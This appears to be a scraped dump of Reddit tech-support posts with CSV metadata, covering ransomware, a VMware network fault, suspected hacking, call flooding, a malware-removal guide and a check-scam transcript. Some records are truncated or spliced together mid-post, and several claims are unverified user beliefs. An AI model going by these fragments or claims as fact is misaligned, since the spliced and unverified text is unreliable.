&gt;hi reddit. so i've gotten a encryption+extortion virus on my computer as shown in the picture above. the entire program was created and run at 00:00, 25-5-2015 (system time, GMT+8). more details of my work so far below.

&gt;did some rudimentary research on my own. while the virus is pretty sophisticated, it did a pretty bad job of hitting my important files, and whatever is important is stored on the cloud so i've paused all syncing while i recover those files through google/dropbox/onedrive etc. it did, however, disable system restore, so that is not an option.

&gt;in the meanwhile, running antivirus does not help, but i have managed to trace the task to the C:\ProgramData folder. Some suspicious activity there. Firstly, the Locker program was traced to a folder within %PROGRAMDATA% called rkcl.exe, in which contained several data files (picture of folder: http://imgur.com/KU1NN07). rkcl.exe is the program that intrudes my screen, and ldr.exe seems to be a service that runs itself automatically. 

&gt;more folders in %PROGRAMDATA% that raise flags: folders named tor, steg, and digger were created either on 25/5 or a few days prior to that.

&gt;opening the data files yielded certain information already accessible through the Locker program itself, but data.aa7 contained a string as below:

&gt;&lt;RSAKeyValue&gt;&lt;Modulus&gt;*some stuff here (not sure if sensitive)*&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;

&gt;i am not sure if this is of any significance, though it seems to be cryptography-related.

&gt;i'm not exactly sure what to do now. i have a feeling the chance of getting the files restored is low, to which i don't particularly mind as most of it is on the cloud. i do wish to be rid of this software at the very least though. any suggestions on what my next step should be? thanks!

&gt;System Specs:
Custom Laptop running Windows 8.1 Pro Build 9600    
Processor: Intel(R) Core(TM) i7-4700MQ CPU @ 2.40GHz, 2401 Mhz, 4 Core(s), 8 Logical Processor(s)    
Graphics Card: Intel(R) HD Graphics 4600/NVIDIA GeForce GTX 780M    
Installed Physical Memory (RAM): 8.00 GB    
    
&gt;**EDIT**: i've wiped my computer and reinstalled, so that should clear the ransomware. in the meanwhile, i will continue to monitor the thread and provide updates should any developments arise in dealing with this.

&gt;for now, the ransomware does seem new, so the solution would be to **reinstall windows and restore from a backup**(nuke and pave). if the files are very important, you could try **paying the ransom, but with no guarantee it will actually be restored.**

&gt;we've also deduced that the software was likely embedded in the computer by accessing a malicious website (highly unlikely to be a downloaded file) up to a week before 25/5, and activated by the local clock hitting midnight. the files can be traced mostly to the ProgramData folder (see above for locations), although it could be hiding elsewhere too.

&gt;**EDIT 2**: there's still a lot of speculation to what the source could be, most likely due to the delayed fuse in the ransomware itself. so far, some similarities found include cracked minecraft, Chrome, and sports streaming. all three purported sources have people claiming to have never touched them, though.",https://www.reddit.com/r/techsupport/comments/373wk0/locker_virus_similar_to_cryptolocker/,1432487823.0,233,0.99,628,techsupport,barbsicle
36e021,"I've stumped VMware support for 2 months: after a catastrophic power loss on my environment, VMs randomly have no network connection after reboot until I ping a public IP address","About 100 exchanges and a dozen techs later, the battle continues. I'm getting nothing but spitballs at this point from vendors. I can't be the only one to ever experience this, but I'm starting to wonder after 2 months.

With a number of excuses, the power outage outlasted our battery backup and nothing was nicely powered down in time. The network issue apparently started along with the power returning, as it was a wicked struggle to get servers individually booted in the right order, forcing later ones to wait until we could verify connectivity. Entire pools of client VMs came up with the network issue, but not every pool, and not every VM in other pools. 

The exact issue is that problem VMs can not resolve any hostnames, nor ping any internal IP address except the gateway, but they *can* ping most external addresses. **As soon as a public IP was pinged (we've been using 8.8.8.8), all other network functionality immediately returned.** Now able to see the connection server, users could log in. While I've gone back and forth with VMware, we've developed a morning routine of logging in on the console to any ""Agent Unreachable"" problem machines, doing the ""ping trick,"" and logging out. ""Protocol Failure"" is also common, but a reboot will usually ""graduate"" those into the unreachable state. About 50% of the time, when a client VM reboots, it ends up stuck in one of these states. The ping trick fixes it every time.

I've tried a number of recomposes, and even building brand new pools, but the issue is the same. During provisioning, machines will get stuck on ""Customizing"" after automatic reboots, but will complete the provisioning after a ping trick. I'm pretty sure every physical device has been cleanly rebooted since the power outage. I updated and rebooted hosts a couple times since, and noticed some machines also get stuck on ""unreachable"" after a migration. 

I'm not having any problems with my network outside the VMware environment, including in any of my other four deployments. Also, I've not had a single network problem with any PCs, which cover about 15% of the workstations and servers.

**Setup:**

* Cisco UCS 5100 chassis, 4 hosts (B200 M3)

* 2x Cisco 6296UP Fabric Interconnects

* 40GB lacp link to network core (Brocade ICX stack)

* EMC VNX5300 SAN

* VMware ESXi 5.1

* 250 virtual machines in the problem location (Win 7 clients, VMXNET 3 NIC)

Most of the suggestions from support were updates (agents, drivers, etc.) and recomposes. Logs haven't revealed anything yet. Keeping my fingers crossed that someone out there has seen this before.

369r15,Desperate-I am slowly losing my mind. This has affected my work/social life. I am being monitored/spied on. I finally feel safe again and then something else happens,"   Right now I have 12 partitions on my mac and I cannot format them.  I can only see them logging into root amd then recovery.  
    My iphone was being rerouted and calls were going through what I remember it saying incoming and outgoing using apn.  I dont know what that is but saws friends phone and layout was different.  I have changed phones and reformated and done everything I can.  
   I used to be a cs major in college but changed and so I just researched.  Thry were using tftp to remotely come into my computer.  They are not stopping, advanced.  know the actual mac addresses of my devices and computers, bluetooth, wifi and ethernet.  I used carbon copy clone to have a rebootable drive, and saw once again files and logs of my activity.  If I am online in any way they know through mobile devices.

I got a new computer a week ago and this time installed windows, not os.  There habe been security alerts about unknown on network.  I looked and it was my iphone, bluetooth off.  I looked at settings and saw bluetooth and wifi had the same address, dont knkw if that is right.  the mac was using a fibre channel, which is capable, but i didnt set up.  The windows under processes had Bonjour and was connecting.  

One of thr times I tried to fight back. I went to users and settings and then computer went slow.  A circle was drawn around my icon.  I have recieved emails from people I know from the past and them writing to me, saying things that only I would know about in my personal life.  I ask them and they say I didn't write that to you.

I downloaded little snitch a few days ago and I saw constant, every second attempts to connect from ip adresses.  The first time I looked at their files they were actuslly using a program a manager from apple support downloaded on my mac to see a problem I was having months before.  

I know I sound paranoid, but this isnt stopping.  I have 12 mounted partitions on my mac.  When i reinstslled osx I looked at the all my files tab.  In the informstion tab which looks at the process it said query and a bunch of lines of code and then com.microsoft on a fresh version of osx.  

They have all my passwords, since there has been logging in from my email accounts, stole money from bank. My hard drives I am no longer going into as each of them I think is now infected as I have used them as backups.  4 or 5 drives with a lot of personal info, pkctures and thousands of dollars worth of software.  I have license codes on those drives, for all vmware software, windows, which I need for work.  I got fired from a few gigs because the passwords to the websites I managed were saved and then sktes hijacked.  

I need to start at home.  How can I make my network totally secure?  What steps should I use,  Im willing to spend anything at this point.  

Macbook Pro 2011
1tb HD, 16gb ram
Currently on osx lion since that is what netboot allowed, but they altered plist files.  Main computer, Has 12 hidden partitions that I do not know how to reformat, need a walkthrough.

UPDATE:  I want to thank you guys for really actually talking those of you that showed concern.  Its hard if I am battling my own mind but I dont think so and neither do my friends ill try to get one of them to login.  ok presently I am on way home from the Apple Store.  They saw me two hours late typical.  They asked me if I had a reciept for my fucking 4 year old computer, I brought the setup disks and stuff I got with the computer but they told me unless I had reciept cant do anything.

Mind you I have had tnis computer serviced before.  If you are still here I need your help still if you are willing.  There is a firmware password on the computer and cannot unlock.  I vaguely remember setting it but I have changed close to 20 passwords in the last week.  I forget setting it, not saying I didnt.  Supposedly there is a workaround, but I dont kniw of one still working MB pro 8,2 .  No superdrive working.  Im rationalizing apples constant managemnt on little snitch now, but you guys have me thinking doubts. This is NUMBER ONE

POSSIBLE SCENARIO
OK while I was waiting for hours Iwas checking my regular emails and also apps that I have under my accounts.  I thi k I found the the issue to one problem.  4 months ago while practicing I opened a Heroku account.  I Had it linked with my github which was in turn Iinked to my  Github for Mac.  I als o only forked one thing my own package.  WHATS THIS https://github.com/devenvelope/volatility.  I had my mapand an open source map I made and shared publicly for the homeless and resources for them.  I Havent used the account since then.  This application was deployed.  I linked my google account and a pop up popped up logged into gihub about another IP being logged.  Also in san francisco and very similar to mine, Im on my tablet but I think its my phone. Also there are other logins with the most populous being from columbus ohio and a link I followed from github shows this most populous  http://i.imgur.com/wjjnlnt.png   I have never been there then my ip on different applications like Kloudless Google drive and github mmobile github firefox and numerous others I never signed up for.
And then programming link towards a dns I USED to use, now nooope.

Fresh build, running SLI surround on my monitors. This is my first solo build and I decided to really ball out so I don't have to really upgrade for a while. I've tried some common sense troubleshooting but I'm not sure how to isolate any issue to any single component.  

Running into seemingly random issues such as:

 * Random screen flickering (By far the most annoying)
      * I've tried reseating the GPU's and unplugging/replugging the PCI cables. The flickering happens across all 3 monitors at the same time, so I'm doubting it's a cable issue. I've ordered and swapped all 3 displayports just in case, but it doesn't seem to have fixed the issue.

 * Random freezing
       * Not sure if related to the above issue. Background sounds such as music still plays while screen is frozen. Happens the most when running new processes.

 * Seemingly random crashes when idle
       * System will randomly just stop responding when idling for a while. Cannot get system to respond by pressing any keys or by any mouse activity. Only way to correct issue is full restart. I can tell because any huge downloads I have running will be at an impossibly low progress point when restarting computer.

 * Boot devices will randomly not be detected at start up or restart
       * Especially following restarts resulting from the above error. System will boot to bios, no peripherals such as HDD's or optical drives will be shown in boot settings. Only way to alleviate issue is to shut down the system, power down PSU from the switch on the back and power back on after a couple seconds.

 * Infinite BSOD loop when attempting to run ASUS autoclocking software
       * Ran auto OC to lowest setting, and this put my system in a BSOD loop. I stopped it by going into bios settings at start up and resetting OC to default values and doing the same when I was able to get back into windows.

 * LAN doesn't activate right away at start up. Same with USB drives.
      * So what happens  is the computer starts up, tells me there's connectivity issues with LAN, displays yellow triangle. Sometimes running trouble shooting will fix it by resetting the connection settings, sometimes it won't find an issue and I fix it by unplugging and replugging the ethernet cable. Other devices such as laptops do not have this issue when plugged into the same cable.


 * I've also tried unseating all components from mother board including PSU and reconnecting everything. No go. 
 * All drivers and BIOS is up to date. 
 * Dusted everything
 * Tried plugging PSU into different outlets, and seperating peripherals such as printer, monitors, speakers etc to completely different outlets. Thought maybe surge protector wasn't giving my tower enough power, but still have the same issues plugged straight into the wall

I want to say this is either a motherboard or power supply issue as I'm not sure how this many things can go wrong at the same time on a new build with completely new parts. I haven't tried a fresh install of Windows, as I have some data that would be a pain to back up. I am hoping I can find a working solution while avoiding this one.",https://www.reddit.com/r/techsupport/comments/343n6w/this_was_completely_ignored_in_rbuildapc_this_is/,1430183808.0,76,0.9,82,techsupport,Sivuplay1101

33j6wb,"Reverse phone DDOS? Getting calls faster than I can reject them, essentially making my number useless.","First, I appologize if this isn't the best place  to ask this, but I can't think of someplace else to ask about it. If you have a better place for me to post, let me know and I'll post there.

---

So at about 3pm today (eastern time) I got a call from a number I've never seen. I answer and they say ""Hey, you call me?"" I say no and we hang up. Not 5 seconds later I get another call from another number and I answer it, we have a similar exchange and I hang up. Again, another call from another number which I rejected. Again and again and again, someone calls and I reject it.

I have been getting phone calls for 4 hours now from all different people saying I called them. My phone doesn't go more than 3 seconds without a phone call. My voice mail box fills up faster than I can delete the messages. And now people are texting me back with all kinds of crazy messages, as if I'm a telemarketer saying things like ""Please take me off your list!"" or ""I'm on the DO NOT CALL LIST"". It's constant. I've even gotten some threatening messages talking about killing me, and another guy who thought I was someone who is sleeping with his girlfriend and has threatened to kill himself. I can't keep my phone from ringing long enough to test him to straighten it out.

---

So my guess is someone is doing some sort of DDOS where they are robo-dialing hundreds or thousands of numbers, and spoofing it so it looks like the call is coming from me. Then they hang up, leaving those people to return calls to me, which results in me being over loaded.

I called the phone company, and they were completely unhelpful. They first asked me if the phone was in my pocket at the time, as if to imply I butt dialed these people. Yeah, I butt dialed 2,000 people, idiot. Then he said hes never heard of anything like this, and to just turn my phone off for the time being and call back tomorrow if it persist and they will change my number. I don't want to fucking change my number. 

---

So my question is this:

* Does anyone have any more information about a scam or attack that might be happening to me? Like more reading or some terms I can google? I can't find anything about this happening anywhere else online.

* Any idea how to stop it? I'm gonna be mad if I have to change my number. It seems like bullshit that the phone company can't stop this kind of attack. Why do they even allow spoofing when it opens the doors to this type of thing. I would hope there is like an FCC website where I can report it and find the people doing it to get them in trouble, but I'm guessing the phone company will say they can't trace spoofed calls.

* Any information is appreciated.

TL;DR - Receiving calls faster than I can reject them from all different numbers, want to make it stop or more info.",https://www.reddit.com/r/techsupport/comments/33j6wb/reverse_phone_ddos_getting_calls_faster_than_i/,1429744285.0,91,0.98,27,techsupport,glitchn

 *If you suspect you are infected with any form of malware that encrypts your files, DO NOT follow this guide! Please make a post instead. Your files are at stake.*

&amp;#x200B;

**Tip:** Windows 7 and below is no longer supported by Microsoft and UNSAFE to use. If you are still running Windows 7 with a LEGIT license, you can obtain a free upgrade to Windows 10 by using the [Windows 10 Upgrade Assistant](https://www.microsoft.com/en-us/software-download/windows10) from Microsoft. They have been very generous in continuing to allow users to upgrade from Windows 7 at no charge. *Do this upgrade AFTER your system has been cleaned of malware. A system image backup is highly recommended before starting this process. This backup can be performed to an external hard drive with the* [Backup &amp; Restore tool](https://i.imgur.com/B0I3FgI.png) *located in the Control Panel on Windows 7 and up.*

 

**Purpose &amp; Scope of this Guide:**

This guide is designed to assist you in removing malware from an infected system *that successfully boots*. If your computer is completely unable to boot due to malware, please make a post, as this guide will not help you. If you perform the following steps exactly as described, this will solve your problem in over 90% of scenarios. That said, not all malware is created equal, and not all malware removal tools are created equal. The tools recommended in this guide were picked because of their high success and low failure rates, measured on a very large scale. However, there will be times that this guide fails in removing malware. If that is the case, please make a post for further assistance, stating that this guide was unsuccessful. It is recommended to only accept advice from a “Trusted” technician. I am writing this guide in layman’s terms so that most people will be able to understand it with ease.

 

**Disclaimer:**

The following instructions are recommendations only. You take full responsibility for any steps you choose to perform on your computer. While the following recommendations are performed without issue on countless machines, there is always a risk of damaging your Operating System or experiencing data loss on any machine. **It is solely YOUR responsibility to save all work and back up any and all important data on your system before proceeding.** 

 

**Malware Remediation Steps:**

*Before proceeding, go into your browser’s extensions and remove all suspicious items. Also go into your browser’s settings and remove any default search providers and unusual homepages. If you are unsure how to do this, proceed to Step 1.*

 

*Download and run the following tools in this order. Run all tools unless otherwise instructed. All tools should be run in Normal Mode (not Safe Mode) unless you are unable to boot Normal Mode, or the scans fail in Normal Mode. All tools must be run under an Administrator account. Do not remove any tool-generated logs in the event a helper needs you to post them to further assist you.*

 

**1) Run** [**rkill.com**](https://www.bleepingcomputer.com/download/rkill/dl/10/)**. Sometimes it takes a few minutes to finish. Do not reboot when done.**

* Kills running malicious processes
* Removes policies in the registry that prevent normal OS operation
* Repairs file extension hijacks

 

**2) Download an updated copy** [**Malwarebytes 4.0**](https://www.malwarebytes.com/mwb-download/thankyou/)**. Turn on the “**[**Scan for Rootkits**](https://i.imgur.com/5lLJB3R.png)**” option. Then, run a “**[**Scan**](https://i.imgur.com/fDFSVy4.png)**”**

* Successfully removes the vast majority of infections
* Has an industry-leading, lightning fast scanning  &amp; heuristics engine
* Has built-in repair tools to fix damage done by malware

 

**3) Run** [**Malwarebytes ADWCleaner 8**](https://toolslib.net/downloads/viewdownload/1-adwcleaner/) **using the “**[**Scan Now**](https://i.imgur.com/hwFbaQZ.png)**” button.**

* Removes majority of adware, PuPs, Toolbars, and Browser hijacks
* Scans for bloatware &amp; pre-installed sofware and lets you quarantine any or all of it.
* Fixes proxy settings changed by malware
* Removes certain non-default browser settings

 

 

**Optional, Advanced Step (only run if previous tools fail to solve problem):**

**4) Run Sophos** [**HitmanPro**](http://get.hitmanpro.com/)

* [Here](https://i.imgur.com/oT7CjuN.png) is HitmanPro.

HitmanPro is a phenomenal ""second-opinion"" malware scanner. I recommend clicking ""Settings"" and uncheck ""Scan for tracking cookies"" before starting the scan. This will drastically reduce scan times. This tool can only be run ONCE for free. Use it wisely.

 

**Please note:** If malware has prohibited you from browsing the web or downloading files, you can try running the [NetAdapter Repair Tool](http://www.bleepingcomputer.com/download/netadapter-repair-all-in-one/)  with [all options checked](http://i.imgur.com/XLv1ZUW.png) which will attempt to restore your internet connection &amp; default browser settings. You may have to download these tools on another computer and move them to a flash drive that you can plug into the infected machine.

 

**Think your Mac is infected?**

Try [Malwarebytes Anti-Malware for Mac](https://www.malwarebytes.com/mac/). Please make a post if it is unsuccessful.

 

If you have run all of the above tools successfully, you should be malware-free. If you are still experiencing problems, please make a post in /r/techsupport for further assistance.

 

**Follow-up Steps (highly recommended):**

* Using a computer that has not been infected, change passwords to all your online accounts.
* Consider enabling two-factor authentication on all accounts!
* Install a better anti-virus. See recommendations below.

 

**What is malware?**

[Malware](http://en.wikipedia.org/wiki/Malware) is an umbrella term used to refer to a variety of forms of hostile or intrusive software, including computer viruses, worms, trojan horses, ransomware, spyware, adware, scareware, and other malicious programs. It can take the form of executable code, scripts, active content, and other software. \[Source: Wikipedia.com\]

 

**How did I get infected?**

It is difficult to track down the source of an infection. Most infections are actually given permission to run unknowingly by the user. It is recommended to keep User Account Control turned on and never give access to something you do not trust or did not open. Many other infections come via exploits in your browser or browser plug-ins on websites you visit. Always be very careful what you install. Make sure you trust the source implicitly. When downloading programs, always use the publisher’s website directly.

 

**How to prevent future infections:**

Be very careful what you download and install. Keep your software up-to-date. Using [Ninite](http://ninite.com) for installing/updating software is very easy &amp; safe and uses official installers without adding extra software to your PC during installation. Make sure Windows is kept up-to-date as well, including Windows 10 feature updates. Many Windows updates patch exploits and vulnerabilities in your operating system. Most infections are active because the user has unknowingly given it Administrative permission to install and run. The first line of defense starts with you.

 

**The following tools will aide you in keeping your computer clean:**

 

**Free Anti-Virus Suggestions:**

* [Malwarebytes 4.0](https://www.malwarebytes.com/mwb-download/thankyou/) (Next-generation anti-virus replacement, free version must be run MANUALLY)
* [BitDefender](http://www.bitdefender.com/solutions/free.html)
* [ESET Free Online Scanner](http://www.eset.com/us/online-scanner/)

Free AVs will only go so far. I highly recommend purchasing the AV of your choice to get better protection. Companies who offer products for free are usually making money off you one way or another. This has been [proven again recently with Avast](https://www.cnet.com/news/antivirus-firm-avast-is-reportedly-selling-users-web-browsing-data/). If you use Avast, uninstall it immediately.

325592,"Techsupport friends, be wary if doing freelance work!!!","Hey guys, I just had an interesting experience so I thought I would give everyone a heads up.

I  work occasionally as freelance tech support through craigslist, setting up and fixing random desktops, laptops, phones, etc. Apparently, the new thing that scammers do now is reply to ads needing saying they need a service, and then they try to get your info like that. Here is a transcript of my email conversation with ""Matthew"":


&amp;nbsp;
&amp;nbsp;

Hi,
      I will like to know if your service is still available? Kindly cc/forward your response to my email at ""somename@gmail.com""

 i will reply back immediately.

Thanks

Mathew.

-

Hi Matthew,

I am definitely still available! What can I help you with?

-

Thanks for your response, Am sorry for not getting back in a timely manner. I have been contracted to fix up some HP laptops but at the moment am in Rochester, New York attending to some other jobs. In view of this we are looking to offer you this job and we want you to handle the fixing of the laptops on agreed terms.

These are what need to be done on the laptops.

1. Format Hard Drive,

2. Instal Win 7,

3. Microsoft Office Package,

4. AVG Virus Software (Free Lifetime Updates)

5. Adobe Acrobat,

6. Diagnostics of the entire system after to check hard drive, cdrom, floppy, etc.

So if you are capable of handling this get back to me with the total cost for handling each unit based on a total cost of (5) Units. I have all the necessary software and license needed for the service installations, Please kindly get back to me with your information, so that my Secretary can prepare a check to you.

Full Name to write on the Check,

Mailing Address Apt # or suite

City, State, Postal code, with your cell phone number to contact you.

Note: I have a assigned a reliable &amp; responsible shipper, who will be handling the delivery of the laptops to you and also the pick up after you have completed the job.  I will be looking forward to hear from you.

Respectively.

-

Hi Matthew,

I would definitely be interested in helping you out with this! I will be able to complete everything in 24 hours, and can do it quicker if needed. Usually I would charge $X for this service, but seeing as there are five units I will do it for $Y per laptop, making the total cost $Z.

I just have a few quick questions. First, will the laptops be delivered directly to me? Also, when will they be delivered? I can start work as soon as they get here, I would just like an idea for when to expect them. Also, do you have a work email, or something of that sort, so I could authenticate who you are?

I look forward to working with you!

-

The laptops will be deliver to your address by the shipper and pick up from you after completing the work. So you are not meeting any body any where.

Kindly email me your information to proceed.

-

Matthew,
I'm sorry to have to do this, but I must insist that you give me some sort of authentication for who you are or who you work for. As I said before a work email would be ok, or even a company website or Facebook with your name on it, or something similar. It's sad that I have to do this, but there are just too many scams out there, especially on craigslist, so I make it a rule to not give out personal information like my address unless I know what is fully going on.

As soon as I get some sort of verification, I will send you my information right away. Again, sorry I have to ask for this, but I deem it necessary.

-

Once you send your info for the check.

-

I'm sorry but I won't be able to do business with you. Please don't contact me again unless you change your mind and decide to provide me with some sort of verification.

&amp;nbsp;
&amp;nbsp;

Seemed reasonable at first, but it quickly went downhill. After some research, I find out that their emails were originating in a different state, some 800 miles away. I know scams on craigslist are common, but I've never had anyone reply to an ad of mine in this fashion before, so I thought I would let you all know to keep an eye out.

30ja6f,"WiFi ridiculously (like 10+ minutes to load a Google search) slow on every single computer on the network, but perfectly fast on every phone or tablet on the same network. Please help. I'm going insane.","We have a brand new Arris TG862 wireless router provided by Comcast. Every single phone on our network, even foreign ones like ones belonging to friends coming over and newly connecting to the network, get expectedly quick speeds on WiFi. Even my mom's LG G3 can load 4k videos with no wait. 

However, every computer on the WiFi network, even desktops and my BRAND NEW, FORMATTED ZENBOOK that I just opened, get cripplingly slow speeds on the same network, even if *no other devices are connected to the network at that time*.

These aren't just slightly annoying speeds, these are speeds that make the network unusable. 10 minutes to load a Google search, upwards of a half hour to load videos in 360p. 

Speedtest.net on the computers literally goes so slow that the test won't even complete. It just gets stuck at 0.00Mbps forever. SOMETIMES it will get ~0.15Mbps down. But on phones the results are ~10ms/~25Mbps/~10Mbps. 

How do I fix this? I am comfortable with connecting to and changing settings for the router, and familiar enough with computers to do whatever with them. I just don't know networking.

2zoyun,Have no clue what to do...,"Before I begin,  I'd like to say that no matter how ridiculous this may sound, I'm being 100% honest and I'm freaking out.

Running Windows 7.

A couple weeks ago, my keyboard and mouse started acting up and I've never really thought anything of it.

Then a few days ago my computer started to type things by itself. I don't remember anything originally, but last night it happened again and seemed to be coherent.

I was just finishing up a recording in Cubase and I got on to Facebook to post something. It deleted everything I wrote and said ""I don't hear you. I don't hear death.""

So, yeah, I started to freak out. I got out my phone and tweeted about it and I ran downstairs to tell my dad. I dunno, in case I was found dead today, so they would know what happened.

I went back upstairs and I was gonna run Google searches on how to fix it and it deleted my search and wrote ""CALM DOWN.""

So, naturally, I screamed and turned off my Wi-Fi connection. I figured maybe somebody was connected through TeamViewer. After the WiFi was off, it then wrote (in the start menu search box) ""you broke your controller.""

Which I did, but it was probably over a year ago. Nobody has been in my room besides my parents and none of my friends would even know about the prank typing thing on ThinkGeek, let alone be able to plug it in when I'm not here. 

Obviously I thought it was paranormal originally, but I just realized that it was typing in a perfect beat and it backspaced a lot, every time it typed something. So then I figured maybe it's a piece of malware or something.

None of my Anti Virus scans showed anything. I don't have another keyboard to test. It's also definitely not a macro. 

If any of you have any suggestions please let me know. If I can't fix it I'll run a system restore. If that doesn't work I'm going to light it on fire.

Edit: Ridiculous spelling

Edit 2: It's been almost 24 hours since the original mishap and not a thing has occurred, not even in the way of my mouse randomly clicking and such as it was before. I did many things including running the Tron Script and deleting the Razer drivers and stuff. Not sure what exactly fixed it. (If it is fixed.)

If anything happens again, I'll make sure to let you all know. Thank you all for your help, and thank you for taking me seriously. I know how crazy this all sounds.

2yrf3c,Dad has personality disorder and is severely paranoid about internet router access; noticed something weird this morning.,"Hey /r/techsupport,

Here's a doozy. My Dad is a narcissist and diagnosed with a personality disorder and as a result, is constantly paranoid. His most extreme topic to be paranoid about, among police and neighbours, is technology! He runs a Toshiba laptop with Windows although his number #1 is the internet. He's convinced someone is always hacking into his internet or he has a key logger on his computer, either a neighbour or someone in China, stealing his internet password. Yep. I also live in the apartment he build downstairs while I study law (and I keep an eye on his mail-order family for their safety) so I need to be on the internet a lot and it gets so annoying when he's messing around with it. 

He's worked out how to get onto the router and now he has a allow access list and unless your MAC address is on the list you can't get on. So I have: my iPhone, my macbook, boys iPhone, boys laptop, Playstation and Dad has: his laptop, Xbox, wife's iPad and daughters laptop. He's constantly resetting the list so we have to go up and get everything added again so it's annoying. 

At the moment he's denying everyone access because this morning he changed the router password, noticed the router lights blinking like crazy and checked the router. Apparently his computer was on there, and another unidentified MAC address (which I googled and it's a Microsoft device). So now he's convinced someone has somehow gotten the password he just changed and logged onto his router in less than 5 minutes. Only he and I were home at 9am and I was sleeping! He's asking me for an explanation and expecting one because I'm young and know how to technology. I feel like I gotta come up with the answer to stop this craziness and regain my internet access to study.

Any suggestions? ",https://www.reddit.com/r/techsupport/comments/2yrf3c/dad_has_personality_disorder_and_is_severely/,1426134071.0,74,0.94,75,techsupport,mydadisdrivingmenuts

2xhdtu,"After 10 years, Avast and I are pretty much through. Any suggestions for alternative protection?","**Thank you for all the suggestions! I think I've got a handle on my options here, but I'll post back if there are further issues!**

So I don't know if this is a series of shit updates or what, but over the past year or so the filter driver avast installs has become so bloated it's unbearable. 

I've got a PC that can kick the crap out of most games on high settings, everything executable or often used is on SSD, and it is still brought to its knees by the sheer amount of latency added to I/O operations.

As a quick example that highlights the problem at its worst, I have a flash drive with a full python development environment on it for one of my classes. I started an IPython prompt and timed the period between launch from explorer, and when the actual interface came up with IPython waiting for input.

The results:

 With avast realtime scanning on: 26 seconds

 With avast realtime scanning off: ***6*** seconds

So yeah, between this, intermittent hangs mid-I/O operation (I seriously suspect this is the avast driver deadlocking, I've had it BSoD on me as well.), and avast just straight up deleting executables it hasn't seen enough **without prompting me about it**, it's doing more harm than good.

Mind you this is also reproducible on my mom's laptop and our shared desktop, so I seriously doubt it's hardware related. All of them run different editions of windows 7 (home, pro, and ultimate respectively).


Any suggestions on good network-based scanners or resource friendly AV would be GREATLY appreciated. This has been driving me up a wall for a long time now!

2xf9vh,"French known streamer (League of Legends) getting perma DDOSed, tried everything ...!","Hi everyone,

My nickname is Shaunz and I am currently the jungler for the new team Millenium.

I have been streaming on this channel www.twitch.tv/shaunzpro and been getting a lot of viewers since then (1k5 per stream). It is awesome to stream and I love it.

Unfortunately it attracted some jealousy and there is one guy that keeps on DDOSing me no matter what. I know his Twitter and who is he but I won't tell his name because I don't want him to be known.

But yeah, I have tried everything !

- Changing my IP (in France mine dynamic)
- Buying a VPN and connecting my Skype to it (you can resolve my Skype, you won't find my IP)
- Killing all processes and just streaming on OBS + Twitch stream
- Buying a VPN for my phone and not using Skype on phone

I've tried pretty much every combination of it. I do not have Steam running, nor anything. I have passed a scan (Malware and CCleaner) to make sure there is no infested files.

He already DDOSed me 5 streams in a row in 7 days, whenever I streamed.

However, the good point is that I am pretty much conviced he is not anymore going by Skype because when I started to hide my Skype IP he didn't DDOS me for 2 days. There is no way he can get my IP since I am not using Skype anymore without VPN.
I have also read Destiny post about DDOS.

I would like you guys to help me out, maybe there is someone that knows stuff about recent way to DDOS or things like this.

I really want to stream and be able to show my games and keep on improving, I love this game.

Can you guys help me somehow? :-)

Additionally, the molecules look differently on a newer version. The molecules are used for a book that comes out every year and for consistency purposes it would be better if the molecules had the same appearance.

EDIT 6 (Tuesday Afternoon):  There is no way to root this phone without dealing with a bootloader or something that every forum says we have to wait for.  I contacted a Data Forensics company in Austin that might be able to do something, but if I have to go that route I am going to have to wait until I get paid on the 15th.  They are going to call me back sometime today to let me know if they can even do anything.  Meanwhile, any suggestions that require the phone to be rooted are no good.  I can't thank y'all enough, though.  I'll deliver something as soon as I figure out what I need to do next.

EDIT 7 (Tuesday still):  I have a call with the guy from Austin at 2pm or so Central - I'll let y'all know what he thinks.

EDIT 8 (Tues.):  They are going to email me some detailed info regarding what they do to get the video.  Obviously, I probably won't understand one fucking detail, but I'll post it here.  For now, you guys stay awesome.  I need to get some work done.

EDIT 9:  YOU GUYS ARE ABOVE-AVERAGE!!!!  A company in Oklahoma just offered to forensically recover the video for me as pro-bono, pro-civil right, just plain badass way to help me out.  Once again, no matter what....  I will post the video as soon as I can, no matter how it makes me look.   I am Fed-Exing the phone there this afternoon.

EDIT 11:  Not much new today to report except that my phone arrived at the Data Forensics facility.  FedEx Tracking 807519987715

EDIT 12:  Wednesday activities:  Phone will be dumped by Thursday morning when recovery work will commence.

EDIT 13:  Got an email this morning (Thursday) saying they are recovering the data today.  That does not mean shit to the great reveal.  I made the mistake of scrolling too low in some of the other threads this ended up on, and I am not having my integrity questioned anymore - at least where I can do something about it.  [This is my Uber receipt](http://imgur.com/iRjEBul) from the night of the incident showing that I went HOME and did not, as some claim, have a DWI that I am just covering up for.  Check the address, it is the hospital - not the jail.

EDIT 14:  I had another update from the guys in OKC with my phone.  They were able to pull a lot of old contacts, messages, etc. from my phone, but no video.  They want to use a new code they have for this new phone (Verizon Note 4) to see what they can get.  They estimate a Tuesday completion.  That does not mean I am going to upload the video if I get it right away.  My attorney and ABC-13 in Houston are going to make sure that anything I upload does not violate HIPPA laws.  I am here for any other questions anyone has, but you have to be as patient as I am before I upload the video.  I spoke with my attorney today and he is being very cautious about how we go about this.  I got a copy of my medical records from that night which are full of contradictory statements.  You all can expect no updates over the weekend.  Not because I am being deceptive, but mostly because my attorney has a newborn, I need to catch up with my job, and the guys in OKC don't work over the weekend.  This is going to be a process, and as much as I want to deliver ASAP, the data is going to be delivered and the story develops --- and that shit takes time.  I am always available to answer questions if you message me.

EDIT 15 (Monday Night):  Nothing new to report.  Last Friday I was told that there would be either a yes or no on recovery by close of business on Tuesday.  I'm not rushing anybody, so I didn't ask for an update today.  I probably will tomorrow.  I see all of the ""RemindMe"" things, and I want you all to know that it is still in the works.  The sheer amount of professionalism going into this is going to be a valuable addition to the people on this sub that I intended to interact with before this blew up.  I think we are all going to be in a position to learn ""real(ish) time"" how they are handling this.  I don't know dick-one about what is going on technically with my phone, but I'm sure we'll get some insight soon.

EDIT 16 (Tuesday Night):  There is still nothing new to report.  

EDIT 17 (Wednesday Afternoon):  The email from the data forensics company:

&gt;Hello again Reddit friend,
&gt;
&gt;Long story short, you are boned. Our forensic devices were able to semi-dump this phone, but the video you are looking for was not in the dumps.
&gt;
